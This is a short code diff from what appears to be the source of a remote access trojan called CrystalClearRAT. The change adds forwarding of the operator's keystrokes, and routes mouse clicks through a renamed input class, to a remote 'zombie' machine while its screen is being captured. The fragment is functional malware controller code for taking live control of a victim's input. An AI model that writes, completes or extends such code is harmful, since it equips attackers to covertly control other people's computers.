@@ -129,8 +129,15 @@ namespace CrystalClearRAT.Windows
             {
                 System.Windows.Point mousePositon = e.GetPosition(screenImage);
                 //  Console.WriteLine($"X: {mousePositon.X} Y: {mousePositon.Y}, xMax: {screenImage.ActualWidth}, yMax: {screenImage.ActualHeight}");
-                Server.Send(ControlMouse.ClickInfo((int)mousePositon.X, (int)screenImage.ActualWidth, (int)mousePositon.Y, (int)screenImage.ActualHeight), zombie);
+                Server.Send(ControlInput.ClickInfo((int)mousePositon.X, (int)screenImage.ActualWidth, (int)mousePositon.Y, (int)screenImage.ActualHeight), zombie);
             }
+        }
+
+
+        private void Window_KeyDown(object sender, KeyEventArgs e)
+        {
+            if(screenshotTimer.IsEnabled)
+            Server.Send(ControlInput.KeyInfo(KeyInterop.VirtualKeyFromKey((e.Key))), zombie);
         }
     }
 }
